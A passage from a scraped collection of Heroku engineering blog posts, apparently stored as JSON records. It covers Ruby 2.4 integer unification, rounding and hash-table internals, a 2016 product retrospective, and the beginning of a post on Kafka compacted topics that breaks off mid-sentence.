CRuby (ILP32) | -2**30          | 2**30 - 1        |\n| 64-bit CRuby (LLP64) | -2**30          | 2**30 - 1        |\n| 64-bit CRuby (LP64)  | -2**62          | 2**62 - 1        |\n| JRuby                | -2**63          | 2**63 - 1        | The range of Fixnum can vary quite a bit between Ruby implementations. In JRuby for example a Fixnum is any number between -2 63 and 2 63 -1.\nCRuby will either have Fixnum values between -2 30 and 2 30 -1\nor -2 62 and 2 62 -1, depending on the underlying C data model. Your Numbers Are Wrong, You're Not Using All the Bits You're right, even though we have 64 bits available we're only using 62 of them in CRuby and 63 in JRuby.\nBoth of these implementations use two's complement integers, binary values that use one of the bits to store\nthe sign of the number. So that accounts for one of our missing bits, how about that other one? In addition to the sign bit, CRuby uses one of the bits as a FIXNUM_FLAG , to tell the interpreter whether\nor not a given word holds a Fixnum or a reference to a larger number. The sign bit and the flag bit are at\nopposite ends of the 64-bit word, and the 62 bits left in the middle are the space we have to store a number. In JRuby we have 63 bits to store our Fixnum , because JRuby stores both Fixnum and Bignum as 64-bit signed values; they don't need a FIXNUM_FLAG . Why Are They Changing It Now? The Ruby team feels that the difference between a Fixnum and\na Bignum is ultimately an implementation detail, and not something that needs\nto be exposed as part of the language. Using the Fixnum and Bignum classes directly in your code can lead to\ninconsistent behavior, because the range of those values depends on so many\nthings. They don't want to encourage you to depend on the ranges of these\ndifferent Integer types, because it makes your code less portable. Unification also significantly simplifies Ruby for beginners. When you're\nteaching your friends Ruby you longer need to explain the finer points of 64-bit\nprocessor architecture. Rounding Changes In Ruby Float#round has always rounded floating point numbers up for decimal\nvalues greater than or equal to .5, and down for anything less, much as you\nlearned to expect in your arithmetic classes. # ruby-2.3.3\nirb> (2.4).round\n# => 2\nirb> (2.5).round\n# => 3 During the development of Ruby 2.4 there was a proposal to change this default\nrounding behavior to instead round to the nearest even number, a strategy known\nas half to even rounding, or Gaussian rounding (among many other names). # ruby-2.4.0-preview3\nirb> (2.4).round\n# => 2\nirb> (2.5).round\n# => 2\nirb> (3.5).round\n# => 4 The half to even strategy would only have changed rounding behavior for tie-breaking;\nnumbers that are exactly halfway (.5) would have been rounded down for even numbers, and up\nfor odd numbers. Why Would Anyone Do That? The Gaussian rounding strategy is commonly used in statistical analysis and financial transactions, as the\nresulting values less significantly alter the average magnitude for large sample sets. As an example let's generate a large set of random values that all end in .5: # ruby-2.3.3\nirb> halves = Array.new(1000) { rand(1..1000) + 0.5 }\n# => [578.5...120.5] # 1000 random numbers between 1.5 and 1000.5 Now we'll calculate the average after forcing our sum to be a float, to ensure we\ndon't end up doing integer division: # ruby-2.3.3\nirb> average = halves.inject(:+).to_f / halves.size\n# => 510.675 The actual average of all of our numbers is 510.675, so the ideal rounding strategy\nshould give us a rounded average be as close to that number as possible. Let's see how close we get using the existing rounding strategy: # ruby-2.3.3\nirb> round_up_average = halves.map(&:round).inject(:+).to_f / halves.size\n# => 511.175\nirb> (average - round_up_average).abs\n# => 0.5 We're off the average by 0.5 when we consistently round ties up, which makes\nintuitive sense. So let's see if we can get closer with Gaussian rounding: # ruby-2.3.3\nirb> rounded_halves = halves.map { |n| n.to_i.even? ? n.floor : n.ceil }\n# => [578...120]\nirb> gaussian_average = rounded_halves.inject(:+).to_f / halves.size\n# => 510.664\nirb> (average - gaussian_average).abs\n# => 0.011000000000024102 It would appear we have a winner. Rounding ties to the nearest even number brings us\nmore than 97% closer to our actual average. For larger sample sets we can expect the\naverage from Gaussian rounding to be almost exactly the actual average. This is why Gaussian rounding is the recommended default rounding strategy in\nthe IEEE Standard for Floating-Point Arithmetic (IEEE 754) . So Ruby Decided to Change It Because of IEEE 754? Not exactly, it actually came to light because Gaussian rounding is already the\ndefault strategy for the Kernel#sprintf method , and\nan astute user filed a bug on Ruby: \"Rounding modes inconsistency between round versus sprintf\" . Here we can clearly see the difference in behavior between Kernel#sprintf and Float#round : # ruby 2.3.3\nirb(main):001:0> sprintf('%1.0f', 12.5)\n# => \"12\"\nirb(main):002:0> (12.5).round\n# => 13 The inconsistency in this behavior prompted the proposed change, which actually made it\ninto one of the Ruby 2.4 preview versions, ruby-2.4.0-preview3 : # ruby 2.4.0-preview3\nirb(main):006:0> sprintf('%1.0f', 12.5)\n# => \"12\"\nirb(main):007:0> 12.5.round\n# => 12 In ruby-2.4.0-preview3 rounding with either Kernel#sprintf or Float#round will give the same result. Ultimately Matz decided this fix should not alter the default behavior of Float#round when another\nuser reported a bug in Rails: \"Breaking change in how #round works\" . The Ruby team decided to compromise and add a new keyword argument to Float#round to allow us to set alternative rounding strategies ourselves: # ruby 2.4.0-rc1\nirb(main):001:0> (2.5).round\n# => 3\nirb(main):008:0> (2.5).round(half: :down)\n# => 2\nirb(main):009:0> (2.5).round(half: :even)\n# => 2 The keyword argument :half can take either :down or :even and the default\nbehavior is still to round up, just as it was before. Why preview Versions Are Not for Production Interestingly before the default rounding behavior was changed briefly for 2.4.0-preview3 there was\nan unusual Kernel#sprintf bug in 2.4.0-preview2 : # ruby 2.4.0-preview2\nirb> numbers = (1..20).map { |n| n + 0.5 }\n# => => [1.5, 2.5, 3.5, 4.5, 5.5, 6.5, 7.5, 8.5, 9.5, 10.5, 11.5, 12.5, 13.5, 14.5, 15.5, 16.5, 17.5, 18.5, 19.5, 20.5]\nirb> numbers.map { |n| sprintf('%1.0f', n) }\n# => [\"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"12\", \"14\", \"14\", \"16\", \"16\", \"18\", \"18\", \"20\", \"20\"] In this example Kernel#sprintf appears to be rounding numbers less than 12 up as though it was\nusing the Float#round method's default behavior, which was still in place at this point. The preview releases before and after 2.4.0-preview2 , both 2.4.0-preview1 and 2.4.0-preview3 ,\nshow the expected sprintf behavior, consistent with ruby-2.3.3 : # ruby 2.4.0-preview1\nirb> numbers.map { |n| sprintf('%1.0f', n) }\n# => [\"2\", \"2\", \"4\", \"4\", \"6\", \"6\", \"8\", \"8\", \"10\", \"10\", \"12\", \"12\", \"14\", \"14\", \"16\", \"16\", \"18\", \"18\", \"20\", \"20\"]\n\n# ruby 2.4.0-preview3\nirb> numbers.map { |n| sprintf('%1.0f', n) }\n# => [\"2\", \"2\", \"4\", \"4\", \"6\", \"6\", \"8\", \"8\", \"10\", \"10\", \"12\", \"12\", \"14\", \"14\", \"16\", \"16\", \"18\", \"18\", \"20\", \"20\"] I discovered this by accident while researching this article and started digging\nthrough the 2.4.0-preview2 changes to see if I could identify the cause. I found\nthis commit from Nobu : commit 295f60b94d5ff6551fab7c55e18d1ffa6a4cf7e3\nAuthor: nobu <nobu@b2dd03c8-39d4-4d8f-98ff-823fe69b080e>\nDate:   Sun Jul 10 05:27:27 2016 +0000\n\n    util.c: round nearly middle value\n\n    * util.c (ruby_dtoa): [EXPERIMENTAL] adjust the case that the\n      Float value is close to the exact but unrepresentable middle\n      value of two values in the given precision, as r55604.\n\n    git-svn-id: svn+ssh://ci.ruby-lang.org/ruby/trunk@55621 b2dd03c8-39d4-4d8f-98ff-823fe69b080e Kernel#sprintf Accuracy in Ruby 2.4 This was an early effort by Nobu to handle cases where floating point numbers rounded\ninconsistently with Kernel#sprintf in ruby-2.3.3 (and before): # ruby-2.3.3\nirb> numbers = (0..9).map { |n| \"5.0#{n}5\".to_f }\n# => [5.005, 5.015, 5.025, 5.035, 5.045, 5.055, 5.065, 5.075, 5.085, 5.095]\nirb> numbers.map { |n| sprintf(\"%.2f\", n) }\n# => [\"5.00\", \"5.01\", \"5.03\", \"5.04\", \"5.04\", \"5.05\", \"5.07\", \"5.08\", \"5.08\", \"5.09\"] In the example above notice that 5.035 and 5.045 both round to 5.04. No matter what strategy Kernel#sprintf is using this is clearly unexpected. The cause turns out to be the unseen\nprecision beyond our representations. Not to worry though, the final version of Nobu's fixes resolves this issue, and it will be available in Ruby 2.4. Kernel#sprintf will now consistently apply half to even rounding: # ruby-2.4.0-rc1\nirb> numbers = (0..9).map { |n| \"5.0#{n}5\".to_f }\n# => [5.005, 5.015, 5.025, 5.035, 5.045, 5.055, 5.065, 5.075, 5.085, 5.095]\nirb> numbers.map { |n| sprintf(\"%.2f\", n) }\n# => [\"5.00\", \"5.02\", \"5.02\", \"5.04\", \"5.04\", \"5.06\", \"5.06\", \"5.08\", \"5.08\", \"5.10\"] Better Hashes Ruby 2.4 introduces some significant changes to the hash table backing Ruby's Hash object. These changes were prompted by Vladimir Makarov when he submitted a\npatch to Ruby's hash table earlier this year. If you have a couple of hours to spare that issue thread is an entertaining read,\nbut on the off-chance you're one of those busy developers I'll go through the\nmajor points here. First we need to cover some Ruby Hash basics. If you're already an expert on Ruby hash internals feel free to skip ahead and read about the specific hash changes in Ruby 2.4. How Ruby Implements Hash Let's imagine for a moment that we have a severe case of \"not invented here\" syndrome,\nand we've decided to make our own Hash implementation in Ruby using arrays.\nI'm relatively certain we're about to do some groundbreaking computer science here\nso we'll call our new hash TurboHash , as it's certain to be faster than the original: # turbo_hash.rb\nclass TurboHash\n  attr_reader :table\n\n  def initialize\n    @table = []\n  end\nend We'll use the @table array to store our table entries. We gave ourselves a\nreader to access it so it's easy to peek inside our hash. We're definitely going to need methods to set and retrieve elements from our\nrevolutionary hash so let's get those in there: # turbo_hash.rb\nclass TurboHash\n  # ...\n\n  def [](key)\n    # remember our entries look like this:\n    # [key, value]\n\n    find(key).last\n  end\n\n  def find(key)\n    # Enumerable#find here will return the first entry that makes\n    # our block return true, otherwise it returns nil.\n\n    @table.find do |entry|\n      key == entry.first\n    end\n  end\n\n  def []=(key, value)\n    entry = find(key)\n\n    if entry\n      # If we already stored it just change the value\n      entry[1] = value\n    else\n      # otherwise add a new entry\n      @table << [key, value]\n    end\n  end\nend Excellent, we can set and retrieve keys. It's time to setup some benchmarking and\nadmire our creation: require \"benchmark\"\n\nlegacy = Hash.new\nturbo  = TurboHash.new\n\nn = 10_000\n\ndef set_and_find(target)\n  target = rand\n\n  target[key] = rand\n  target[key]\nend\n\nBenchmark.bm do |x|\n  x.report(\"Hash: \") { n.times { set_and_find(legacy) } }\n  x.report(\"TurboHash: \") { n.times { set_and_find(turbo) } }\nend\n\n#                  user     system      total        real\n# Hash:        0.010000   0.000000   0.010000 (  0.009026)\n# TurboHash:  45.450000   0.070000  45.520000 ( 45.573937) Well that could have gone better, our implementation is about 5000 times slower than\nRuby's Hash . This is obviously not the way Hash is actually implemented. In order to find an element in @table our implementation traverses the entire\narray on each iteration; towards the end we're checking nearly 10k entries one at\na time. So let's come up with something better. The iteration is killing us, if we can find\na way to index instead of iterating we'll be way ahead. If we knew our keys were always going to be integers we could just store the values\nat their indexes inside of @table and look them up by their indexes later. The issue of course is that our keys can be anything, we're not building some cheap\nknock-off hash that can only take integers. We need a way to turn our keys into numbers in a consistent way, so \"some_key\" will\ngive us the same number every time, and we can regenerate that number to find it again later. It turns out that the Object#hash is perfect for this purpose: irb> \"some_key\".hash\n# => 3031662902694417109\nirb> \"some_other_key\".hash\n# => -3752665667844152731\n\nirb> \"some_key\".hash\n# => 3031662902694417109 The Object#hash will return unique(ish) integers for any object in Ruby, and\nyou'll get the same number back every time you run it again with an object that's \"equal\"\nto the previous object. For example, every time you create a string in Ruby you'll get a unique object: irb> a = \"some_key\"\n# => \"some_key\"\nirb> a.object_id\n# => 70202008509060\n\nirb> b = \"some_key\"\n# => \"some_key\"\nirb> b.object_id\n# => 70202008471340 These are clearly distinct objects, but they will have the same Object#hash return\nvalue because a == b : irb> a.hash\n# => 3031662902694417109\nirb> b.hash\n# => 3031662902694417109 These hash return values are huge and sometimes negative, so we're going to use\nthe remainder after dividing by some small number as our index instead: irb> a.hash % 11\n# => 8 We can use this new number as the index in @table where we store the entry. When we\nwant to look up an item later we can simply repeat the operation to know exactly where\nto find it. This raises another issue however, our new indexes are much less unique than they were\noriginally; they range between 0 and 10. If we store more than 11 items we are certain\nto have collisions, overwriting existing entries. Rather than storing the entries directly in the table we'll put them inside arrays\ncalled \"bins\". Each bin will end up having multiple entries, but traversing the bins\nwill still be faster than traversing the entire table. Armed with our new indexing system we can now make some improvements to our TurboHash . Our @table will hold a collection of bins and we'll store our entries in the\nbin that corresponds to key.hash % 11 : # turbo_hash.rb\nclass TurboHash\n  NUM_BINS = 11\n\n  attr_reader :table\n\n  def initialize\n    # We know our indexes will always be between 0 and 10\n    # so we need an array of 11 bins.\n    @table = Array.new(NUM_BINS) { [] }\n  end\n\n  def [](key)\n    find(key).last\n  end\n\n  def find(key)\n    # now we're searching inside the bins instead of the whole table\n    bin_for(key).find do |entry|\n      key == entry.first\n    end\n  end\n\n  def bin_for(key)\n    # since hash will always return the same thing we know right where to look\n    @table[index_of(key)]\n  end\n\n  def index_of(key)\n    # a pseudorandom number between 0 and 10\n    key.hash % NUM_BINS\n  end\n\n  def []=(key, value)\n    entry = find(key)\n\n    if entry\n      entry[1] = value\n    else\n      # store new entries in the bins\n      bin_for(key) << [key, value]\n    end\n  end\nend Let's benchmark our new and improved implementation: user     system      total        real\nHash:        0.010000   0.000000   0.010000 (  0.012918)\nTurboHash:   3.800000   0.010000   3.810000 (  3.810126) So that's pretty good I guess, using bins decreased the time for TurboHash by\nmore than 90%. Those sneaky Ruby maintainers are still crushing us though,\nlet's see what else we can do. It occurs to me that our benchmark is creating 10_000 entries but we only have 11\nbins. Each time we iterate through a bin we're actually going over a pretty large\narray now. Let's check out the sizes on those bins after the benchmark finishes: Bin:  Relative Size:          Length:\n----------------------------------------\n0     +++++++++++++++++++     (904)\n1     ++++++++++++++++++++    (928)\n2     +++++++++++++++++++     (909)\n3     ++++++++++++++++++++    (915)\n4     +++++++++++++++++++     (881)\n5     +++++++++++++++++++     (886)\n6     +++++++++++++++++++     (876)\n7     ++++++++++++++++++++    (918)\n8     +++++++++++++++++++     (886)\n9     ++++++++++++++++++++    (952)\n10    ++++++++++++++++++++    (945) That's a nice even distribution of entries but those bins are huge. How much faster\nis TurboHash if we increase the number of bins to 19? user     system      total        real\nHash:        0.020000   0.000000   0.020000 (  0.021516)\nTurboHash:   2.870000   0.070000   2.940000 (  3.007853)\n\nBin:  Relative Size:          Length:\n----------------------------------------\n0     ++++++++++++++++++++++  (548)\n1     +++++++++++++++++++++   (522)\n2     ++++++++++++++++++++++  (547)\n3     +++++++++++++++++++++   (534)\n4     ++++++++++++++++++++    (501)\n5     +++++++++++++++++++++   (528)\n6     ++++++++++++++++++++    (497)\n7     +++++++++++++++++++++   (543)\n8     +++++++++++++++++++     (493)\n9     ++++++++++++++++++++    (500)\n10    +++++++++++++++++++++   (526)\n11    ++++++++++++++++++++++  (545)\n12    +++++++++++++++++++++   (529)\n13    ++++++++++++++++++++    (514)\n14    ++++++++++++++++++++++  (545)\n15    ++++++++++++++++++++++  (548)\n16    +++++++++++++++++++++   (543)\n17    ++++++++++++++++++++    (495)\n18    +++++++++++++++++++++   (542) We gained another 25%! That's pretty good, I bet it gets even better if we keep\nmaking the bins smaller. This is a process called rehashing, and it's a pretty\nimportant part of a good hashing strategy. Let's cheat and peek inside st.c to see how Ruby handles increasing the table\nsize to accommodate more bins: /* https://github.com/ruby/ruby/blob/ruby_2_3/st.c#L38 */\n\n#define ST_DEFAULT_MAX_DENSITY 5\n#define ST_DEFAULT_INIT_TABLE_SIZE 16 Ruby's hash table starts with 16 bins. How do they get away with 16 bins?\nWeren't we using prime numbers to reduce collisions? We were, but using prime numbers for hash table size is really just a defense against bad hashing\nfunctions. Ruby has a much better hashing function today than it once did, so the Ruby maintainers stopped using prime numbers in Ruby 2.2.0 . What's This Other Default Max Density Number? The ST_DEFAULT_MAX_DENSITY defines the average maximum number of entries Ruby will allow in each bin before rehashing:\nchoosing the next largest power of two and recreating the hash table with the new, larger size. You can see the conditional that checks for this in the add_direct function from st.c : /* https://github.com/ruby/ruby/blob/ruby_2_3/st.c#L463 */\n\nif (table->num_entries > ST_DEFAULT_MAX_DENSITY * table->num_bins) {...} Ruby's hash table tracks the number of entries as they're added using the num_entries value on table . This way Ruby doesn't need to count the entries\nto decide if it's time to rehash, it just checks to see if the number of entries\nis more than 5 times the number of bins. Let's implement some of the improvements we stole from Ruby to see if we can speed up TurboHash : class TurboHash\n  STARTING_BINS = 16\n\n  attr_accessor :table\n\n  def initialize\n    @max_density = 5\n    @entry_count = 0\n    @bin_count   = STARTING_BINS\n    @table       = Array.new(@bin_count) { [] }\n  end\n\n  def grow\n    # use bit shifting to get the next power of two and reset the table size\n    @bin_count = @bin_count << 1\n\n    # create a new table with a much larger number of bins\n    new_table = Array.new(@bin_count) { [] }\n\n    # copy each of the existing entries into the new table at their new location,\n    # as returned by index_of(key)\n    @table.flatten(1).each do |entry|\n      new_table[index_of(entry.first)] << entry\n    end\n\n    # Finally we overwrite the existing table with our new, larger table\n    @table = new_table\n  end\n\n  def full?\n    # our bins are full when the number of entries surpasses 5 times the number of bins\n    @entry_count > @max_density * @bin_count\n  end\n\n  def [](key)\n    find(key).last\n  end\n\n  def find(key)\n    bin_for(key).find do |entry|\n      key == entry.first\n    end\n  end\n\n  def bin_for(key)\n    @table[index_of(key)]\n  end\n\n  def index_of(key)\n    # use @bin_count because it now changes each time we resize the table\n    key.hash % @bin_count\n  end\n\n  def []=(key, value)\n    entry = find(key)\n\n    if entry\n      entry[1] = value\n    else\n      # grow the table whenever we run out of space\n      grow if full?\n\n      bin_for(key) << [key, value]\n      @entry_count += 1\n    end\n  end\nend So what's the verdict? user     system      total        real\nHash:        0.010000   0.000000   0.010000 (  0.012012)\nTurboHash:   0.130000   0.010000   0.140000 (  0.133795) We lose. Even though our TurboHash is now 95% faster than our last version,\nRuby still beats us by an order of magnitude. All things considered, I think TurboHash fared pretty well. I'm sure there are\nsome ways we could further improve this implementation but it's time to move on. At long last we have enough background to explain what exactly is about to\nnearly double the speed of Ruby hashes. What Actually Changed Speed! Ruby 2.4 hashes are significantly faster. The changes introduced by\nVladimir Makarov were designed to take advantage of modern processor caching\nimprovements by focusing on data locality. This implementation speeds up the Ruby hash table benchmarks in\naverage by more 40% on Intel Haswell CPU. https://github.com/ruby/ruby/blob/trunk/st.c#L93 Oh Good! What? Processors like the Intel Haswell series use several levels of caching to speed up\noperations that reference the same region of memory. When the processor reads a value from memory it doesn't just take the value it needs;\nit grabs a large piece of memory nearby, operating on the assumption that it is\nlikely going to be asked for some of that data in the near future. The exact algorithms processors use to determine which bits of memory should get loaded\ninto each cache are somewhat difficult to discover. Manufacturers consider these strategies\nto be trade secrets. What is clear is that accessing any of the levels of caching is significantly faster than\ngoing all the way out to pokey old RAM to get information. How Much Faster? Real numbers here are almost meaningless to discuss because they depend on so many factors\nwithin a given system, but generally speaking we can say that L1 cache hits (the fastest level\nof caching) could speed up memory access by two orders of magnitude or more. An L1 cache hit can complete in half a nanosecond. For reference consider that a photon\ncan only travel half a foot in that amount of time. Fetching from main memory will generally\ntake at least 100 nanoseconds. Got It, Fast... Therefore Data Locality? Exactly. If we can ensure that the data Ruby accesses frequently is stored close together in\nmain memory, we significantly increase our chances of winning a coveted spot in one of the\ncaching levels. One of the ways to accomplish this is to decrease the overall size of the entries themselves. The\nsmaller the entries are, the more likely they are to end up in the same caching level. In our TurboHash implementation above our entries were stored as simple arrays, but in ruby-2.3.3 table entries were actually stored in a linked list. Each of the entries contained a next pointer\nthat pointed to the next entry in the list. If we can find a way to get by without that pointer and make the entries\nsmaller we will take better advantage of the processor's built-in caching. The new approach in ruby.2.4.0-rc1 actually goes even further than just removing the next pointer,\nit removes the entries themselves. Instead we store the entries in a separate array, the \"entries array\",\nand we record the indexes for those entries in the bins array, referenced by their keys. This approach is known as \"open addressing\". Open Addressing Ruby has historically used \"closed addressing\" in its hash table, also known as \"open hashing\".\nThe new alternative approach proposed by Vladimir Makarov uses \"open addressing\", also known as\n\"closed hashing\". I get that naming things is hard, but this can really get pretty confusing. For\nthe rest of this discussion, I will only use open addressing to refer to the new implementation, and\nclosed addressing to refer to the former. The reason open addressing is considered open is that it frees us from the hash table. The table entries\nthemselves are not stored directly in the bins anymore, as with a closed addressing hash table,\nbut rather in a separate entries array, ordered by insertion. Open addressing uses the bins array to map keys to their index in the entries array. Let's set a value in an example hash that uses open addressing: # ruby-2.4.0-rc1\nirb> my_hash[\"some_key\"] = \"some_value\" When we set \"some_key\" in an open addressing hash table Ruby will use the hash\nof the key to determine where our new key-index reference should live in the bins array: irb> \"some_key\".hash\n# => -3336246172874487271 Ruby first appends the new entry to the entries array, noting the index where it was stored.\nRuby then uses the hash above to determine where in the bins array to store the key,\nreferencing that index. Remember that the entry itself is not stored in the bins array, the key only\nreferences the index of the entry in the entries array. Determining the Bin The lower bits of the key's hash itself are used to determine where it goes in the bins array. Because we're not using all of the available information from the key's hash this\nprocess is \"lossy\", and it increases the chances of a later hash collision when we go\nto find a bin for our key. However, the cost of potential collisions is offset by the fact that choosing a\nbin this way is significantly faster. In the past, Ruby has used prime numbers to determine the size of the bins array.\nThis approach gave some additional assurance that a hashing algorithm which didn't\nreturn evenly distributed hashes would not cause a single bin to become unbalanced in size. The bin size was used to mod the computed hash, and because the bin size was prime,\nit decreased the risk of hash collisions as it was unlikely to be a common factor\nof both computed hashes. Since version 2.2.0 Ruby has used bin array sizes that correspond to powers of\ntwo (16, 32, 64, 128, etc.). When we know the bin size is going to be a factor\nof two we're able to use the lower two bits to calculate a bin index, so we\nfind out where to store our entry reference much more quickly. What's Wrong with Prime Modulo Mapping? Dividing big numbers by primes is slow. Dividing a 64-bit number (a hash) by a prime can take\nmore than 100 CPU cycles for each iteration, which is even slower than accessing main memory. Even though the new approach may produce more hash collisions, it will ultimately\nimprove performance, because collisions will probe the available bins linearly. Linear Probing The open addressing strategy in Ruby 2.4 uses a \"full cycle linear congruential generator\". This is just a function that generates pseudorandom numbers based on a seed, much\nlike Ruby's Rand#rand method. Given the same seed the Rand#rand method will generate the same sequence of numbers,\neven if we create a new instance: irb> r = Random.new(7)\n# => #<Random:0x007fee63030d50>\nirb> r.rand(1..100)\n# => 48\nirb> r.rand(1..100)\n# => 69\nirb> r.rand(1..100)\n# => 26\n\nirb> r = Random.new(7)\n# => #<Random:0x007fee630ca928>\nirb> r.rand(1..100)\n# => 48\nirb> r.rand(1..100)\n# => 69\nirb> r.rand(1..100)\n# => 26\n\n# Note that these values will be distinct for separate Ruby processes.\n# If you run this same code on your machine you can expect to get different numbers. Similarly a linear congruential generator will generate the same numbers in sequence\nif we give it the same starting values. Linear Congruential Generator (LCG) This is the algorithm for a linear congruential generator : X n+1 = (a * X n + c ) % m For carefully chosen values of a, c, m and initial seed X 0 the values\nof the sequence X will be pseudorandom. Here are the rules for choosing these values: m must be greater than 0 (m > 0) a must be greater than 0 and less than m (0 < a < m) c must be greater than or equal to 0 and less than m (0 <= c < m) X 0 must be greater than or equal to 0 and less than m (0 <= X 0 < m) Implemented in Ruby the LCG algorithm looks like this: irb> a, x_n, c, m = [5, 7, 3, 16]\n# => [5, 7, 3, 16]\n\nirb> x_n = (a * x_n + c) % m\n# => 6\nirb> x_n = (a * x_n + c) % m\n# => 1\nirb> x_n = (a * x_n + c) % m\n# => 8 For the values chosen above that sequence will always return 6, 1 and 8, in that order.\nBecause I've chosen the initial values with some additional constraints, the sequence\nwill also choose every available number before it comes back around to 6. An LCG that returns each number before returning any number twice is known as a \"full cycle\" LCG. Full Cycle Linear Congruential Generator For a given seed we describe an LCG as full cycle when it will traverse every available state\nbefore returning to the seed state. So if we have an LCG that is capable of generating 16 pseudorandom numbers, it's a full cycle\nLCG if it will generate a sequence including each of those numbers before duplicating any of them. irb> (1..16).map { x_n = (a * x_n + c) % m }.sort\n# => [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15] These are the additional rules we must use when choosing our starting values to make an LCG full cycle: c can't be 0 (c != 0) m and c are relatively prime (the only positive integer that divides both of them is 1) (a - 1) is divisible by all prime factors of m (a - 1) is divisible by 4 if m is divisible by 4 The first requirement makes our LCG into a \"mixed congruential generator\". Any LCG with a non-zero value for c\nis described as a mixed congruential generator, because it mixes multiplication and addition. If c is 0 we call the generator a \"multiplicative\" congruential generator (MCG),\nbecause it only uses multiplication. An MCG is also known as a Lehmer Random Number Generator (LRNG). The last 3 requirements in the list up above make a mixed cycle congruential\ngenerator into a full cycle LCG. Those 3 rules by themselves are called the Hull-Dobell Theorem. Hull-Dobell Theorem The Hull-Dobell Theorem describes a mixed congruential generator with a full period (one that generates all values before repeating). In Ruby 2.4 Vladimir has implemented an LCG that satisfies the Hull-Dobell Theorem,\nso Ruby will traverse the entire collection of bins without duplication. Remember that the new hash table implementation uses the lower bits of a key's hash\nto find a bin for our key-index reference, a reference that maps the entry's key\nto its index in the entries table. If the first attempt to find a bin for a key results in a hash collision, future\nattempts will use a different means of calculating the hash. The unused bits from the original hash are used with the collision bin index to\ngenerate a new secondary hash, which is then used to find the next bin. When the first attempt results in a collision the bin searching function becomes\na full cycle LCG, guaranteeing that we will eventually find a home for our\nreference in the bins array. Since this open addressing approach allows us to store the much smaller references to entries in the bins array, rather than the entirety of the entries themselves,\nwe significantly decrease the memory required to store the bins array. The new smaller bins array then increases our chances of taking advantage of the\nprocessor caching levels, by keeping this frequently accessed data structure close\ntogether in memory. Vladimir improved the data locality of the Ruby hash table. So Ruby is Faster and Vladimir Is Smart? Yup! We now have significantly faster hashes in Ruby thanks to Vladimir and a\nwhole host of other Ruby contributors. Please make sure you make a point of thanking\nthe Ruby maintainers the next time you see one of them at a conference. Contributing to open source can be a grueling and thankless job. Most of the\ntime contributors only hear from users when something is broken, and maintainers\ncan sometimes forget that so many people are appreciating their hard work every day. Want to Make a Contribution Yourself? The best way to express your gratitude for Ruby is to make a contribution. There are all sorts of ways to get started contributing to Ruby, if you're\ninterested in contributing to Ruby itself check out the Ruby Core community page . Another great way to contribute is by testing preview versions as they’re released, and reporting potential bugs on the Ruby issues tracker . Watch the Recent News page ( RSS feed ) to find out when new preview versions are available. If you don't have the time to contribute to Ruby directly consider making a donation to\nRuby development: Donate directly to Ruby development Is that everything new in Ruby 2.4? Not even close. There are many more interesting updates to be found in the Ruby 2.4 ChangeLog. Here are a few of my favorites that I didn't have time to cover: Thread#report_on_exception Thread deadlock detection now includes full backtraces Faster access to instance variables Thank you so much for reading, I hope you have a wonderful holiday. Jonan ruby ruby-2-4 ruby hash ruby integer ruby rounding", "date": "2016-12-25,"},
{"website": "Heroku", "title": "The Heroku 2016 Retrospective", "author": ["Vikram Rana"], "link": "https://blog.heroku.com/heroku-2016-retrospective", "abstract": "The Heroku 2016 Retrospective Posted by Vikram Rana January 02, 2017 Listen to this article As we begin 2017, we want to thank you for supporting Heroku. Your creativity and innovation continues to inspire us, and pushed us to deliver even more new products and features in 2016. We especially want to thank everyone who helped us by beta testing, sharing Heroku with others, and providing feedback. Here are the highlights of what became generally available in 2016. Advancing the Developer Experience Heroku Pipelines A new way to structure, manage and visualize continuous delivery. Heroku Review Apps Test code at a shareable URL using disposable Heroku apps that spin up with each GitHub pull request. Free SSL for Apps on Paid Dynos Get SSL encryption on custom domains for free on apps that use paid dynos. The New Heroku CLI Take advantage of the CLI’s faster performance and new usability features. Heroku Teams Powerful collaboration, administration and centralized billing capabilities to build and run more effective development teams. Flexible Dyno Hours Run a free app 24/7, or many apps on an occasional basis, using a pool of account-based free dyno hours. Threshold Alerting Let the platform keep your apps healthy: get proactive alerts based on app responsiveness and error rates. Session Affinity Route requests from a given browser to the same dyno, so apps with ‘sticky sessions’ can take advantage of Heroku’s flexible scaling. Build Data-Centric Apps on Heroku Apache Kafka on Heroku Build data-intensive apps with ease using the leading open source solution for managing event streams. PostgreSQL 9.6 Speed up sequential scans for faster analytics applications, create indexes without blocking writes on tables in production apps, and more. Heroku External Objects Read and write Postgres data from Salesforce so you can integrate application data in Heroku with business processes inside Salesforce. Heroku Connect APIs Build repeatable automation for configuring Heroku Connect environments, managing connections across Salesforce orgs, and integrating with existing operational systems. Heroku Enterprise: Advanced Trust Controls & Scale for Large Organizations Heroku Private Spaces Have your own private Heroku as a service, with configurable network boundaries, global regions, and private data services for your most demanding enterprise apps. SSO for Heroku Use SAML 2.0 identity providers like Salesforce Identity, Ping and Okta for single sign-on to Heroku Enterprise. Add-on Controls Standardize the add-ons your team uses by allowlisting them within your Heroku Enterprise organization. Onwards! We look forward to continuing our innovation across developer experience, data services, collaboration, and enterprise controls to help you build more amazing applications.  Have a product or feature you'd like to see in 2017? Send us your feedback . P.S. get your Heroku created ASCII artwork here and here .", "date": "2017-01-02,"},
{"website": "Heroku", "title": "Pulling the Thread on Kafka's Compacted Topics", "author": ["Tom Crayford"], "link": "https://blog.heroku.com/debugging-kafka-compacted-topics", "abstract": "Pulling the Thread on Kafka's Compacted Topics Posted by Tom Crayford January 11, 2017 Listen to this article At Heroku, we're always working towards improving operational stability with the services we offer. As we recently launched Apache Kafka on Heroku , we've been increasingly focused on hardening Apache Kafka, as well as our automation around it. This particular improvement in stability concerns Kafka's compacted topics, which we haven't talked about before. Compacted topics are a powerful and important feature of Kafka, and as of 0.9, provide the capabilities supporting a number of important features. Meet the Bug The bug we had been seeing is that an internal thread that's used by Kafka to implement compacted topics (which we'll explain more of shortly) can die in certain use cases, without any notification. This leads to long-term failures and instability of the Kafka cluster, as old data isn't cleared up as expected. To set the stage for the changes we made and the deeper explanation of the bug, we'll cover what log compaction is briefly, and how it works: Just What Are Compacted Topics Anyway? In the default case, Kafka topics are a stream of messages: [ a:1, b:2, c:3 ] There is no way to change or delete previous messages, except that messages that are too old get deleted after a specified \"retention time.\" Compacted topics provide a very different type of stream, maintaining only the most recent message of a given key. This produces something like a materialized or table-like view of a stream, with up-to-date values for all things in the key space.  These compacted topics work by assigning each message a \"key\" (a simple Java byte[] ), with Kafka periodically 